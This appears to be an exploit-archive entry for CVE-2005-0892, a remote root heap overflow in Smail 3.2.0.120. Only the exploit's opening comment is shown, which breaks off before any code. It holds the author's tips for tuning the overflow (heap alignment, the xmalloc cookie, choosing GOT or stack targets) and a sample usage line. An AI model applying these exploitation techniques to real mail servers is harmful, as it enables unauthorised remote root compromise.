    "text": "ecve : CVE-2005-0892 ， title : Smail 3.2.0.120 - Remote Heap Overflow - Linux remote Exploit ， verified : Verified ， exploit_detail : / *  ，  * 0 ，  * smail preparse_address_1 (  ) heap bof remote root exploit ，  * infamous42md AT hotpop DOT com ，  * Shouts :  ，  * BMF , wipe with the left , eat with the right ，  * Notes :  ，  * You can't have any characters in overflow buffer that isspace (  ) returns true ，  * for. The shellcode is clear of them , but if your return address or retloc ，  * has one you gotta figure out another one. My slack box has that situation ,  ，  * heap is at 0x080d.. My gentoo laptop had no such problem and all was fine. I ，  * don't have anymore time to BS around with this and make perfect for any and ，  * all , b/c I've got exam to study for and Law and Order : CI is on in an hour. ，  * If the heap you're targetting is the same way , then try filling it up using ，  * some other commands. If the GOT you're targetting is at such address than ，  * overwrite a return address on the stack. Surely there's a way , check out the ，  * source and be creative ; I'm sure there are some memory leaks somewhere you ，  * can use to fill up heap as well. ，  * You might run into some ugliness trying to automate this for a couple ，  * reasons. xmalloc (  ) stores a cookie in front of buffer , and xfree (  ) checks ，  * for this cookie before calling free (  ) . So you're going to need that aligned ，  * properly unless you can cook up a way to exploit it when it bails out in ，  * xfree (  ) b/c of bad cookie and calls write_log (  )  ( this func calls malloc (  ) so ，  * maybe you can be clever and do something there ) . Furthermore I found that ，  * when trying to trigger this multiple times the alignment was different each ，  * time. There are \"definitely\" more reliable ways to exploit this if you take ，  * a deeper look into code which I don't have time to do right now. The padding ，  * parameter controls the alignment and the size of the chunk being allocated. ，  * You'll probably have to play with it. Yes that's fugly. ，  *  [ n00b @ crapbox.outernet ] ./a.out ，  * Usage : ./a.out < host > < padding > < retloc > < retaddr > ，  *  [ n00b @ crapbox.outernet ] ./a.out localhost 64 0xbffff39c 0x8111ea0 ，  * --{ Smack 1.oohaah ，  * --{ definitely , adv. :  ，  * --{ 1.
